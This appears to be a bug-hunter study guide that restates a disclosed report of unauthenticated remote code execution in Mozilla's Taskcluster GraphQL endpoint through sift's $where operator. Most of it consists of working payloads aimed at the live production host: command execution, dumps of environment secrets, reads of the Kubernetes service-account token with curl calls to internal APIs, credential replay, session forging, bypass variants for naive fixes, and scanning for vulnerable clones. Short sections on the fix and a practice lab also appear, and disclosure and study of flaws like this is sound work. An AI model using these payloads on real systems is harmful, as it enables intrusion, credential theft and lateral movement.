# Code Injection / RCE - Unauthenticated Node.js RCE via GraphQL filter -> sift $where (Original: Mozilla #3782701 - $12,000)

> Original: https://hackerone.com/reports/3782701 | Reporter: griffinf | Disclosed: 2026-08-05 | Severity: Critical | Asset: firefox-ci-tc.services.mozilla.com

## 1. TL;DR for Hunters
Public `/graphql` `filter: JSON` passed straight to `sift(filter)` v17.1.3. `sift` compiles `$where: "<js string>"` via `new Function("obj","return "+str)`. No auth needed, anonymous role has `auth:expand-scopes`. One POST = `execSync("id")` + full env (PG creds, Taskcluster token, OAuth secrets, DB crypto keys). Firefox CI infra compromised.

## 2. Attack Surface & Context
- Stack: Taskcluster monorepo, Node 24, `services/web-server/src/utils/sift.js`, GraphQL `JSON` scalar.
- Endpoints reusing same helper: `Query.expandScopes`, `roles`, `listRoleIds`, `hookGroups`, `hooks`, `currentScopes`.
- Hunt same: any GraphQL `filter: JSON`, `query: JSON`, `where: JSON` + JS libs `sift`, `mongo-query`, `mingo`, `squel`, `sequelize.where`, `eval`, `Function(`. Search GitHub: `sift(filter)` + `filter: GraphQLJSON`.

## 3. Step-by-Step Reproduction (with examples)
```graphql
query($f:JSON){ expandScopes(scopes:["assume:anonymous"], filter:$f) }
variables: {"f":{"$where":"(function(){throw new Error(\"RCE_\"+(6*7)+\"_\"+(typeof process))})()"}}
```
```bash
curl -s https://firefox-ci-tc.services.mozilla.com/graphql \
 -H 'Content-Type: application/json' \
 --data '{"query":"query($f:JSON){expandScopes(scopes:[\"assume:anonymous\"],filter:$f)}","variables":{"f":{"$where":"(function(){throw new Error(\"RCE_\"+(6*7)+\"_\"+(typeof process))})()"}} }'
# => errors[0].message: "RCE_42_object"
```
RCE:
```json
{"$where":"(function(){throw new Error(process.getBuiltinModule(\"child_process\").execSync(\"id\").toString())})()"}
# => uid=1000(node)
```
Env dump: same with `JSON.stringify(process.env)` or `Object.keys(process.env)`. Error channel `formatError.js` returns `err.message` to client = oracle.

Why reliable: resolver echoes `scopes` you send, so array non-empty guaranteed. Anonymous `next()` in `credentials.js` lets it through.

## 4. Root Cause Analysis
```js
// vulnerable
import sift from 'sift';
export default (filter,array)=> filter ? array.filter(sift(filter)) : array;
// sift 17.1.3
test = new Function("obj","return "+params); // params = attacker string
```
Missing: allowlist, `$`-key strip, authz check before filtering, strict GraphQL input type. `CSP_ENABLED` unset so no throw.
Fixed:
```js
if (JSON.stringify(filter).includes("$where")) throw new Error("forbidden");
const ALLOWED = {name:1, scopes:1}; // map manually, no sift on raw
// or sift(filter,{operations:{...without $where}})
```

## 5. Why It Slipped Past Devs
- Trusted internal lib as sanitizer. Thought GraphQL JSON = data, not code.
- Filter seen as UX convenience, not attack surface.
- Anonymous path tested for denial, not for sift execution.
- Error messages returned verbosely for DX.

## 6. Advanced Completions - How to Take It Further
1. Try all resolvers: `roles(filter)`, `hooks(filter)`, `currentScopes(filter)` - same sink.
2. Blind exfil via error length: `throw new Error("a".repeat(secret.length))`, time-based `while(Date.now()<...)`.
3. Read files: `execSync("cat /proc/self/environ; env; ls /; cat /taskcluster/*.json")`.
4. K8s lateral: `execSync("env|grep KUBERNETES; cat /var/run/secrets/kubernetes.io/serviceaccount/token; curl -sk https://kubernetes.default.svc/api/v1/namespaces/default/pods")`.
5. Token replay: `TASKCLUSTER_ACCESS_TOKEN` -> `curl -H "Authorization: Bearer $TOKEN" https://.../api/secrets/v1/secret/...`.
6. Session forge: `SESSION_SECRET=FIXME` -> craft `express-session` cookie offline.
7. Supply chain: Taskcluster `main` branch used by others - scan Shodan `firefox-ci-tc`, `community-tc` clones.
8. Bypass attempt if patched naively: `$where` case variants, `$$where`, unicode `$\\u0077here`, nested `{"a":{"$where":...}}`, prototype `{"__proto__":...}`.

## 7. Hunting Methodology Checklist
- [ ] Find GraphQL introspection: `{"query":"{__schema{queryType{fields{name}}}}"}`
- [ ] Spot `JSON`, `JSONObject`, `Any` scalars on filter/search args.
- [ ] Send `{"$where":"1"}` , `{"$regex":".*"}` , `{"$gt":""}` - does it evaluate?
- [ ] Test anon vs authed - does `next()` allow anon?
- [ ] Check error reflection - force `throw` and see message leak?
- [ ] Fingerprint lib via error: `sift`, `mingo`, `mongo` strings in JS bundle / package.json.
- [ ] Confirm RCE safely: `(6*7)` + `typeof process` first, never `rm`.

## 8. Automation
```bash
# nuclei-style
POST /graphql {"query":"query($f:JSON){expandScopes(scopes:[\"assume:anonymous\"],filter:$f)}","variables":{"f":{"$where":"(function(){throw new Error(\"PWN_\"+(6*7))})()"}}}
# match: PWN_42 in response
```
Burp active scan: insert `$where` payloads into all JSON args. ffuf GraphQL fields via introspection.

## 9. Mitigation & Fix Review
Remove sift from untrusted path, strict input type, strip `$`-keys, set `CSP_ENABLED=1` as defense-in-depth only, rotate ALL creds (DB URLs, TASKCLUSTER_ACCESS_TOKEN, OAuth secrets, PULSE_PASSWORD, DB_CRYPTO_KEYS, Sentry DSN, SESSION_SECRET). Verify: `$where` => 400, no `RCE_42` reflection.

## 10. Practice Lab
- Install `sift@17.1.3` locally: `node -e "require('sift')({\$where:'process.exit(1)'},[{}])"` observe.
- Clone Taskcluster, grep `sift.js`, patch + retest with curl above against localhost.
- PortSwigger GraphQL labs + SSTI mindset applies.

## 11. Key Takeaway for Daily Hunting
Today grep for `sift(`, `new Function`, `filter: JSON` in JS + GraphQL schema. Any open JSON filter = potential server-side JS execution. Test `$where` with math marker first.
